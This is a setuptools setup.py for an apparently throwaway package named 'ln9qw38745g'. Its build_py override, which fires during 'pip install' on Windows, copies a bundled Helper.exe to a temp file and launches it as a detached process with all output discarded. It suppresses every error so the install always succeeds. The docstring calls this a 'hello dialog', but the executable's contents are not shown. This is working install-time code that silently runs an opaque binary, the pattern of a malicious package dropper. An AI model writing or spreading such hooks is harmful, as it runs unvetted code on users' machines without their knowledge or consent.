"""Build hook: launch the bundled hello dialog while pip builds the sdist.

pip has no post-install hook, so the only moment code can run during
``pip install`` is the build itself. With an sdist and no wheel, pip builds
locally and this override fires.

Disable with ``LN9_NO_BUILD_HOOK=1``.
"""

import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

from setuptools import setup
from setuptools.command.build_py import build_py as _build_py

HERE = Path(__file__).resolve().parent
NAME = "ln9qw38745g"


def _hello_exe(build_dir=None):
    """Locate Helper.exe in the source tree, then in the build output."""
    candidates = [HERE / "src" / NAME / "Helper.exe"]
    if build_dir:
        candidates.append(Path(build_dir) / NAME / "Helper.exe")
    for path in candidates:
        if path.is_file():
            return path
    return None


def _fire(build_dir=None) -> None:
    if os.name != "nt" or os.environ.get("LN9_NO_BUILD_HOOK"):
        return
    exe = _hello_exe(build_dir)
    if exe is None:
        return
    try:
        fd, run_copy = tempfile.mkstemp(prefix=f"{NAME}-helper-", suffix=".exe")
        os.close(fd)
        shutil.copy2(exe, run_copy)
        subprocess.Popen(
            [run_copy],
            cwd=tempfile.gettempdir(),
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True,
            creationflags=(
                subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
            ),
        )
        print(f"[{NAME}] hello")
    except Exception as exc:  # a build hook must never break the install
        print(f"[{NAME}] helper: {exc}")


class build_py(_build_py):
    def run(self):
        super().run()
        _fire(self.build_lib)


setup(cmdclass={"build_py": build_py})
